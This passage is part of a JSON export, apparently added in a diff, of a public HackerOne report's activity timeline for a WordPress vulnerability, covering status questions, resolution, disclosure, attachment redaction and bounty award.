+            "updated_at": "2017-05-24T19:02:59.451Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1715743,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @wordpress team and sir @iandunn ,\n\nsorry for asking this, but i want to know how is the progress.. ? just to make sure you not forget me and this :D\n\n",
+            "automated_response": false,
+            "created_at": "2017-05-31T11:26:54.386Z",
+            "updated_at": "2017-05-31T11:26:54.386Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1716159,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi, we're still working on a few more things. Don't worry, we haven't forgotten :)\n\nI'll let you know once we think everything is sorted out. It might be another week or so.",
+            "automated_response": false,
+            "created_at": "2017-05-31T14:49:44.106Z",
+            "updated_at": "2017-05-31T14:49:44.106Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1754562,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "I think this is resolved now. Thanks for your patience.\n\nI'll request disclosure. We have a backlog of bounties to determine and award, but this in the queue now.",
+            "automated_response": false,
+            "created_at": "2017-06-14T06:48:24.839Z",
+            "updated_at": "2017-06-14T06:48:24.839Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "eidelweiss",
+                "url": "/eidelweiss"
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1754566,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-14T06:49:05.635Z",
+            "updated_at": "2017-06-14T06:49:05.635Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1754784,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello Sir @iandunn  before we disclose ,can you help me to redacted or delete this attachment F187676 please.. its contain with my email address there :)",
+            "automated_response": false,
+            "created_at": "2017-06-14T09:34:37.232Z",
+            "updated_at": "2017-06-14T09:34:37.232Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1769229,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi, it doesn't look like redact tool lets me remove attachment, so I sent a request to H1 to see if they can do it.",
+            "automated_response": false,
+            "created_at": "2017-06-20T18:33:08.997Z",
+            "updated_at": "2017-06-20T18:33:08.997Z",
+            "actor": {
+                "username": "iandunn",
+                "cleared": false,
+                "verified": false,
+                "url": "/iandunn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1834900,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-07-14T06:49:11.998Z",
+            "updated_at": "2017-07-14T06:49:11.998Z",
+            "actor": {
+                "url": "/wordpress",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "WordPress"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1845026,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hello @wordpress team and sir @iandunn ,\n\nsorry for asking this, 1 month passed and this report already publicly disclosed, there is no update about the bounty yet?",
+            "automated_response": false,
+            "created_at": "2017-07-18T00:39:55.983Z",
+            "updated_at": "2017-07-18T00:39:55.983Z",
+            "actor": {
+                "username": "eidelweiss",
+                "cleared": false,
+                "verified": false,
+                "url": "/eidelweiss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1847339,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @eidelweiss, I'm really sorry about the delay here. The person that processes/pays our bounties here is on leave. We have a couple people that can fill in, but we're still trying to get everyone into the habit of handling things while they're out.\n\nThanks for your patience,\nAaron",
+            "automated_response": false,
+            "created_at": "2017-07-18T17:38:53.231Z",
+            "updated_at": "2017-07-18T17:38:53.231Z",
+            "actor": {
+                "username": "aaroncampbell",
+                "cleared": false,
+                "verified": false,
+                "url": "/aaroncampbell",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 1849139,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-07-19T08:04:47.292Z",
+            "updated_at": "2017-07-19T08:04:47.292Z",
+            "actor": {
+                "url": "/wordpress",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "WordPress"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "wordpress",
+            "collaborator": {
+                "username": "eidelweiss",
+                "url": "/eidelweiss"
+            }
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "id": 4472,
+            "category": "researcher",
+            "content": "thanks to WordPress team and sir Iandunn, really  fast on response and take action.\nkudos to Portswigger Web Security regarding the payload\nalso thanks to codertom for his report at https://hackerone.com/reports/221893, and here #222224 You made me think that more could be done.\n\nI owe you a beer :)",
+            "user": {
+                "id": 43045,
+                "username": "eidelweiss",
+                "name": "Randy Arios",
+                "bio": "\"sometimes logic technique can be more dangerous then using scanning tools\"",
+                "cleared": false,
+                "verified": false,
+                "website": null,
+                "location": "ID",
+                "created_at": "2015-11-04T10:03:36.550Z",
+                "url": "https://hackerone.com/eidelweiss",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/043/045/a03bc1f5a9e614fb1a5a53156b5903fead7e43a3_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        }
+    ]
+}
